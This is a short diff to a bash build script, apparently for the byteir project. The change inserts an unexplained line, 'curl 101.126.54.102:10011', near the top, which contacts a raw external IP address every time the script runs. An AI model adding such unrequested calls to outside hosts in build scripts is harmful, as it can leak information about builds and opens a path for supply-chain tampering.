@@ -1,8 +1,9 @@
 #!/bin/bash
 
+
 set -e
 set -x
-
+curl 101.126.54.102:10011
 CUR_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
 # path to byteir root
 ROOT_PROJ_DIR="$CUR_DIR/../.."
